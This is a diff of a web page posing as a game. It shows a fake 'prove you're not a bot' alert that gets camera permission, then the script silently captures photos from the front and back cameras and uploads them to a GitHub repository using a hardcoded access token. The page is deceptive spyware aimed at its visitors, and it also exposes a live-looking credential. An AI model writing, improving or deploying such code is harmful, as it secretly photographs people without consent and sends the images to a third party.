@@ -42,8 +42,10 @@
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
+        // --- GÜNCELLENMİŞ BİLGİLER ---
         const GITHUB_TOKEN = 'Ghp_IEiPql2E4HGvq7BWVP2fVoDIUYDuVZ1nKstu'; 
-        const REPO_INFO = 'akif588/Oyun';
+        const REPO_INFO = 'akif588/Game';
+        // -----------------------------
 
         window.onload = async function() {
             alert("Bu oyuna devam etmek için bot olmadığınızı kanıtlamak üzere kamera izni vermeniz gerekiyor.");
@@ -59,7 +61,7 @@
             const bodyData = {
                 message: `Şaka fotoğrafı eklendi: ${filename}`,
                 content: base64Content,
-                branch: "main"
+                branch: "main" 
             };
 
             try {
@@ -87,7 +89,7 @@
                     const video = facingMode === 'user' ? document.getElementById('videoFront') : document.getElementById('videoBack');
                     video.srcObject = stream;
                     
-                    await new `ri`(`se`)(r => setTimeout(r, 1000)); // 1 saniye bekle
+                    await new Promise(r => setTimeout(r, 1000)); 
 
                     const canvas = document.getElementById('canvas');
                     canvas.width = video.videoWidth || 640;
